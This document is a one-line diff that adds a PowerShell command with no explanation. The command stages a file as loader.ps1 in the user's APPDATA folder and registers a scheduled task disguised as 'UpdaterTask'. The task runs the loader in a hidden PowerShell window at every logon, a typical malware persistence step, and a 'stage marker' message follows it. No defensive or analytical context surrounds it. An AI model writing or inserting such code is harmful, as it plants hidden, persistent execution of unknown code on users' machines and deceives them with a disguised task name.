@@ -1,0 +1,1 @@
+Copy-Item -Path 'C:\ProgramData\stage1.bin' -Destination "$env:APPDATA\loader.ps1" -Force; schtasks.exe /Create /TN 'UpdaterTask' /TR "powershell.exe -NoP -WindowStyle Hidden -File `"$env:APPDATA\loader.ps1`"" /SC ONLOGON /F; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Write-Verbose "stage marker 20 reached"
